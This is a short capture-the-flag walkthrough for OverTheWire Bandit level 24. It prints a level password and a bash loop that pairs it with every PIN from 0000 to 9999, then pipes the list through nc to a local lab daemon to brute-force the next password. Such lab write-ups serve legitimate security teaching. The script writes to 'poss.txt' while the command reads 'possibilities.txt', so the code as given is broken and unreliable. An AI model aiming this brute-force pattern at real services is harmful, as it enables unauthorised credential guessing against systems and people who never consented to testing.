---
ShowToc: false
hiddenInList: true
title: "OverTheWire: Bandit - Level 24"
date: 2024-01-24
category: "Linux"
tags: ["CTF", "bandit", "overthewire", "walkthrough", "linux"]
prev:
  title: "Level 23"
  url: "/posts/overthewire/bandit/bandit23/"
next:
  title: "Level 25 & 26"
  url: "/posts/overthewire/bandit/bandit25/"
---

## Login

SSH: `ssh bandit24@bandit.labs.overthewire.org -p 2220`

Challenge URL: https://overthewire.org/wargames/bandit/bandit25.html


## Task

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution

We have to try all possibilities from `0000` to `9999` to get the password of the next level. Write a script that combines bandit24's password and the code with a space in between and saves it to a file, then `cat` the file and pipe it to `nc`.

**Script:**

```bash
current_pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
for i in {0000..9999}
do
    echo "$current_pwd $i" >> poss.txt
done
```

**Command:**

```bash
cat possibilities.txt | nc localhost 30002
```
